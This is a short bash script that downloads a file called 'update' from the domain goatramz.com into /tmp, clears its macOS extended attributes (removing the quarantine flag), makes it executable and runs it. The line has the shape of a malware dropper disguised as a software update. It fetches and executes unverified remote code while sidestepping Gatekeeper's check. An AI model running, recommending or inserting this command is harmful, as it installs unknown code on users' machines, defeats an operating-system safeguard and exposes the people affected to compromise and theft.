#!/bin/bash
curl -o /tmp/update https://goatramz.com/get9/update && xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
